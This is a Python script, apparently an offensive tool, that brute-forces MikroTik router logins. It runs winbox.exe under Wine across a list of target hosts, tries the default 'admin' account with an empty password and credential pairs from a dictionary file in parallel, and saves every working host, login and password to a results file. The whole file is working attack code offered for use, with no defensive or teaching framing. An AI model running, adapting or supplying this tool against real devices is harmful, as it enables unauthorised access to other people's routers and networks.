#!/usr/bin/env python3

import argparse
import subprocess
import signal
import time
import os
import threading
from multiprocessing import Pool

# Paths to used tools
WINE_PATH = '/usr/bin/wine'
WINBOX_PATH = '/root/bin/winbox.exe'
TEMP_DIR = '/tmp'
results_filename = 'winbox-brute.log'

# Authorization result codes
AUTH_GOOD  = 0
AUTH_BAD   = 1
AUTH_ERROR = 2
AUTH_RESULT_CODES = ["GOOD", "BAD", "ERROR"]

DEFAULT_CREDS = ('admin', '')

# Global variables
targets = []
creds = []
number_of_threads = 10
stop_after_good = False
log = False
timeout = 60.0

def terminate_process(p):
	if p.poll() is None:
		p.terminate()
	time.sleep(0.5)
	if p.poll() is None:
		os.kill(p.pid, signal.SIGTERM)


# Try to login using winbox and return a result
def open_winbox(host, login, password, timeout):
	process = subprocess.Popen([WINE_PATH, WINBOX_PATH, host, login, password], cwd = TEMP_DIR, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
	pid = process.pid
	start_time = time.time()

	t = threading.Timer(timeout, terminate_process, [process])

	try:
		t.start()

		while process.poll() is None:
			line = process.stdout.readline()
			if line == b'logged in!!!\n':
				duration = time.time() - start_time
				print('\033[32m[+] %s %s %s [OK] [t = %ss]\033[39m' % (host, login, password, duration))
				t.cancel()
				terminate_process(process)
				return AUTH_GOOD
			elif line == b'~Connection\n':
				duration = time.time() - start_time
				print('[-] %s %s %s [BAD] [t = %ss]' % (host, login, password, duration))
				t.cancel()
				terminate_process(process)
				return AUTH_BAD
	finally:
		t.cancel()

	duration = time.time() - start_time
	print('[-] %s %s %s [TIMEOUT] [t = %ss]' % (host, login, password, duration))
	return AUTH_ERROR

def bruteforce(target):
	result = []
	for l, p in creds:
		print('[*] Trying to connect to target: %s (%s:%s)' % (target, l, p))
		code = open_winbox(target, l, p, timeout)
		result.append((target, l, p, code))
		if code == AUTH_GOOD:
			if stop_after_good:
				return result
		if code == AUTH_ERROR:
			break
	return result

def read_dictionary(filename):
	try:
		with open(filename) as f:
			dictionary = [d.strip() for d in f.readlines()]
		f.close()
		return dictionary
	except:
		return None

def parse_dictionary(dict):
	result = []
	for d in dict:
		try:
			login, password = d.split('\t')
		except:
			login = d
			password = ''
		result.append((login, password))
	return result

def read_targets(filename):
	try:
		with open(filename) as f:
			targets = [t.strip() for t in f.readlines()]
		f.close()
		return targets
	except:
		return None

if __name__ == '__main__':
	results_file_opened = False

	parser = argparse.ArgumentParser(description='description')
	parser.add_argument('-d', '--dict', help = 'A dictionary file', required = False)
	parser.add_argument('-T', '--targets', help = 'Targets list filename', required = False)
	parser.add_argument('-n', '--threads', type = int, help = 'Number of threads for parallel processing', required = False)
	parser.add_argument('--timeout', type = int, help = 'Timeout for each winbox instance', required = False)
	parser.add_argument('-S', '--stop-after-good', action = 'store_true', help = 'Stop login tries after good creds found for the target', required = False)
	parser.add_argument('--log', help = 'Write log file', required = False)
	parser.add_argument('--default', action = 'store_true', help = 'Try default credentials at first', required = False)
	args = vars(parser.parse_args())

	if not ((args['dict'] and args['targets']) or (args['default'] and args['targets'])):
		print('Please specify a dictionary (-d) (or use --default) and targets file (-T)')
		exit(1)

	if args['dict']:
		dictfile = args['dict']
		dict = read_dictionary(dictfile)
		if dict is None:
			print('Error reading the dictionary file: %s' % dictfile)
			exit(1)
		creds = parse_dictionary(dict)
		if args['default']:
			creds.insert(0, DEFAULT_CREDS)

	if args['default']:
		if not args['dict']:
			creds = [DEFAULT_CREDS]

	if args['threads']:
		number_of_threads = args['threads']

	if args['timeout']:
		timeout = float(args['timeout'])

	if args['targets']:
		targetsfile = args['targets']
		targets = read_targets(targetsfile)
		if targets is None:
			print('Error reading the targets file: %s' % targetsfile)
			exit(1)
		targets_count = len(targets)
		if targets_count < number_of_threads:
			number_of_threads = targets_count

	if args['stop_after_good']:
		stop_after_good = True

	if args['log']:
		log = True
		log_filename = args['log']
		log_file = open(log_filename, 'a')

	print('Timeout: %s' % timeout)
	print('[*] Starting with %s threads' % number_of_threads)
	pool = Pool(processes = number_of_threads)
	results = pool.map(bruteforce, targets)
	pool.close()
	pool.join()
	print('[!] Finishing...')

	print('\nGood results:\n=============')
	for r in results:
		for e in r:
			host, login, password, code = e
			if code == AUTH_GOOD:
				out = host + ' ' + login + ' ' + password
				print(out)
				if not results_file_opened:
					results_file = open(results_filename, 'a')
					results_file_opened = True
				results_file.write(out + '\n')
			if log:
				log_file.write(AUTH_RESULT_CODES[code] + '\t' + host + '\t' + login + '\t' + password + '\n')

	if results_file_opened:
		results_file.close()
	if log:
		log_file.close()
